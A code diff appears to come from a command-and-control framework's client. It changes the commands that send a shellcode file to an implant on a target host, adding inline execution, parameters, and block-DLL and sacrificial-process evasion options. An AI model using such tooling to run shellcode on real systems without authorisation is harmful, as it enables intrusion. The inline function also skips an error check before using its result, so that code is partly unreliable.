@@ -5,6 +5,7 @@ import (
 	"github.com/chainreactors/malice-network/client/console"
 	"github.com/chainreactors/malice-network/helper/consts"
 	"github.com/chainreactors/malice-network/proto/implant/implantpb"
+	"strings"
 
 	"google.golang.org/protobuf/proto"
 	"os"
@@ -16,7 +17,7 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.Console) {
 	if session == nil {
 		return
 	}
-
+	sid := con.ActiveTarget.GetInteractive().SessionId
 	//rwxPages := ctx.Flags.Bool("rwx-pages")
 	//interactive := ctx.Flags.Bool("interactive")
 	//if interactive {
@@ -25,66 +26,73 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.Console) {
 	//}
 	pid := ctx.Flags.Uint("pid")
 	shellcodePath := ctx.Args.String("filepath")
+	paramString := ctx.Flags.String("param")
+	isBlockDll := ctx.Flags.Bool("block_dll")
+	isNeedSacrifice := ctx.Flags.Bool("is_need_sacrifice")
+	var params []string
+	if paramString != "" {
+		params = strings.Split(paramString, ",")
+	}
 	shellcodeBin, err := os.ReadFile(shellcodePath)
 	if err != nil {
 		console.Log.Errorf("%s\n", err.Error())
 		return
 	}
-	//if pid != 0 && interactive {
-	//	console.Log.Errorf("Cannot use both `--pid` and `--interactive`\n")
-	//	return
-	//}
-	//shikataGaNai := ctx.Flags.Bool("shikata-ga-nai")
-	//if shikataGaNai {
-	//	if !rwxPages {
-	//		console.Log.Errorf("Cannot use shikata ga nai without RWX pages enabled\n")
-	//		return
-	//	}
-	//	arch := ctx.Flags.String("architecture")
-	//	if arch != "386" && arch != "amd64" {
-	//		console.Log.Errorf("Invalid shikata ga nai architecture (must be 386 or amd64)\n")
-	//		return
-	//	}
-	//	iter := ctx.Flags.Int("iterations")
-	//	console.Log.Infof("Encoding shellcode ...\n")
-	//	resp, err := con.Rpc.ShellcodeEncoder(context.Background(), &clientpb.ShellcodeEncodeReq{
-	//		Encoder:      clientpb.ShellcodeEncoder_SHIKATA_GA_NAI,
-	//		Architecture: arch,
-	//		Iterations:   uint32(iter),
-	//		BadChars:     []byte{},
-	//		Data:         shellcodeBin,
-	//	})
-	//	if err != nil {
-	//		console.Log.Errorf("%s\n", err)
-	//		return
-	//	}
-	//	oldSize := len(shellcodeBin)
-	//	shellcodeBin = resp.GetData()
-	//	console.Log.Infof("Shellcode encoded in %d iterations (%d bytes -> %d bytes)\n", iter, oldSize, len(shellcodeBin))
-	//}
-	//
-	//if interactive {
-	//	executeInteractive(ctx, ctx.Flags.String("process"), shellcodeBin, rwxPages, con)
-	//	return
-	//}
-	//msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
+
 	shellcodeTask, err := con.Rpc.ExecuteShellcode(con.ActiveTarget.Context(), &implantpb.ExecuteShellcode{
-		Bin:  shellcodeBin,
-		Pid:  uint32(pid),
-		Type: consts.ShellcodePlugin,
+		Name:            consts.ModuleExecuteShellcode,
+		Bin:             shellcodeBin,
+		Pid:             uint32(pid),
+		Inline:          false,
+		Params:          params,
+		BlockDll:        isBlockDll,
+		IsNeedSacrifice: isNeedSacrifice,
 	})
 
 	if err != nil {
-		console.Log.Errorf("%s\n", err)
+		con.SessionLog(sid).Errorf("%s\n", err)
 		return
 	}
 
 	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
 		resp := msg.(*implantpb.Spite).GetAssemblyResponse()
 		if resp.Err != "" {
-			console.Log.Errorf("%s\n", resp.Err)
+			con.SessionLog(sid).Errorf("%s\n", resp.Err)
 		} else {
-			console.Log.Infof("Executed shellcode on target\n")
+			con.SessionLog(sid).Consolef("Executed shellcode on target: %s\n", resp.GetData())
+		}
+	})
+}
+
+func ExecuteShellcodeInlineCmd(ctx *grumble.Context, con *console.Console) {
+	session := con.ActiveTarget.GetInteractive()
+	if session == nil {
+		return
+	}
+	sid := con.ActiveTarget.GetInteractive().SessionId
+	path := ctx.Args.String("filepath")
+	paramString := ctx.Flags.String("param")
+	var params []string
+	if paramString != "" {
+		params = strings.Split(paramString, ",")
+	}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		con.SessionLog(sid).Errorf("Error reading file: %v", err)
+		return
+	}
+	shellcodeTask, err := con.Rpc.ExecuteShellcode(con.ActiveTarget.Context(), &implantpb.ExecuteShellcode{
+		Name:   consts.ModuleExecuteShellcode,
+		Bin:    data,
+		Params: params,
+		Inline: true,
+	})
+	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
+		resp := msg.(*implantpb.Spite).GetAssemblyResponse()
+		if resp.Err != "" {
+			con.SessionLog(sid).Errorf("%s\n", resp.Err)
+		} else {
+			con.SessionLog(sid).Consolef("Executed shellcode on target: %s\n", resp.GetData())
 		}
 	})
 }
